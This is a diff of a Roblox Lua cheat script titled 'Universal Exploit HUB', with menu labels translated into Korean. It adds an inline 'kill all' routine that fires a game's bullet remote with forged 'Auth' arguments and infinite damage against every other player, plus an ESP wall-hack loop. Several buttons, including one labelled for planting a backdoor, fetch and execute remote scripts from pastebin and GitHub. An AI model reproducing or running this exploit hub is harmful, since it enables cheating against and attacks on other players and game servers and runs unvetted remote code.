@@ -3,8 +3,8 @@ local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
 local Window = Rayfield:CreateWindow({
     Name = "Universal Exploit HUB",
-    LoadingTitle = "권력겜 Fucking",
-    LoadingSubtitle = "by DJP",
+    LoadingTitle = "잼민겜 Fucking",
+    LoadingSubtitle = "by 전두광",
     ConfigurationSaving = {
        Enabled = true,
        FolderName = nil, -- Create a custom folder for your hub/game
@@ -48,7 +48,7 @@ local Window = Rayfield:CreateWindow({
 
 
  local Slider = PlayerTab:CreateSlider({
-    Name = "WalkSpeed",
+    Name = "스피드",
     Range = {0, 350},
     Increment = 10,
     Suffix = "Speed",
@@ -60,7 +60,7 @@ local Window = Rayfield:CreateWindow({
  })
 
  local Button = PlayerTab:CreateButton({
-    Name = "Infinite Jump",
+    Name = "축지법",
     Callback = function()
         _G.infinjump = not _G.infinjump
 
@@ -69,7 +69,7 @@ local Window = Rayfield:CreateWindow({
             _G.infinJumpStarted = true
             
             --Notifies readiness
-            game.StarterGui:SetCore("SendNotification", {Title="Youtube Hub"; Text="Infinite Jump Activated!"; Duration=5;})
+            game.StarterGui:SetCore("SendNotification", {Title="UE Hub"; Text="Infinite Jump Activated!"; Duration=5;})
         
             --The actual infinite jump
             local plr = game:GetService('Players').LocalPlayer
@@ -89,7 +89,7 @@ local Window = Rayfield:CreateWindow({
  })
 
  local Slider = PlayerTab:CreateSlider({
-    Name = "JumpPower",
+    Name = "점프",
     Range = {1, 350},
     Increment = 1,
     Suffix = "Power",
@@ -101,7 +101,7 @@ local Window = Rayfield:CreateWindow({
  })
 
  local Slider = PlayerTab:CreateSlider({
-    Name = "Health",
+    Name = "체력",
     Range = {1, 99999999999},
     Increment = 1,
     Suffix = "Health",
@@ -127,16 +127,37 @@ local Window = Rayfield:CreateWindow({
  })
 
  local Button = scriptTab:CreateButton({
-    Name = "Backdoor",
+    Name = "백도어 심기",
     Callback = function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua"))()
     end,
  })
 
  local Button = scriptTab:CreateButton({
-    Name = "짭부대 킬올",
+    Name = "짭부대 킬올 [Acs, Ce]",
     Callback = function()
-        loadstring(game:HttpGet('https://pastebin.com/raw/hcuVUteB'))()
+      local Players = game:GetService("Players")
+      local LocalPlayer = Players.LocalPlayer
+      
+      local GunkitRemotes = game:GetService("ReplicatedStorage"):FindFirstChild("Acs_Engine") and game:GetService("ReplicatedStorage"):FindFirstChild("Acs_Engine").Remotes or game:GetService("ReplicatedStorage"):FindFirstChild("Carbon") and game:GetService("ReplicatedStorage"):FindFirstChild("Carbon").Remotes or game:GetService("ReplicatedStorage"):FindFirstChild("GunRemotes")
+      
+      local gr = nil
+      for index, value in pairs(GunkitRemotes:GetChildren()) do
+          if value.Name:lower() == "bullet" then
+              gr = value
+              break
+          end
+      end
+      
+      if gr then
+          for index, player in pairs(Players:GetPlayers()) do
+              if player != LocalPlayer then
+                  gr:FireServer{
+                      "Auth", nil, game.CreatorId, player, math.huge
+                  }
+              end
+          end
+      end
     end,
  })
 
@@ -146,3 +167,48 @@ local Window = Rayfield:CreateWindow({
         loadstring(game:HttpGet('https://raw.githubusercontent.com/userbo/Bakddangdon1/main/script'))()
     end,
  })
+
+ local Button = GameTab:CreateButton({
+   Name = "아스널 ESP",
+   Callback = function()
+      local localplr = game.Players.LocalPlayer
+
+      local function createchams(part, v)
+          if v.Name ~= localplr.Name and not part:FindFirstChild("box") then
+              local BoxHandleAdornment = Instance.new("BoxHandleAdornment")
+              BoxHandleAdornment.Name = "box"
+              BoxHandleAdornment.Parent = part
+              BoxHandleAdornment.Adornee = part
+              BoxHandleAdornment.AlwaysOnTop = true
+              BoxHandleAdornment.ZIndex = 10
+              BoxHandleAdornment.Size = part.Size
+              BoxHandleAdornment.Color3 = Color3.fromRGB(0, 255, 0)
+              BoxHandleAdornment.Transparency = 0.5
+          end
+      end
+      
+      while true do
+          task.wait(0.5)
+          for i, v in pairs(workspace:GetChildren()) do
+              if v:IsA("Model") and v:FindFirstChild("Hitbox") then
+                  local part = v.Hitbox
+                  createchams(part, v)
+              end
+          end
+      end
+   end,
+})
+
+local Button = PlayerTab:CreateButton({
+   Name = "Fly",
+   Callback = function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()
+   end,
+})
+
+local Button = PlayerTab:CreateButton({
+   Name = "Spin",
+   Callback = function()
+       loadstring(game:HttpGet('https://pastebin.com/raw/r97d7dS0', true))()
+   end,
+})
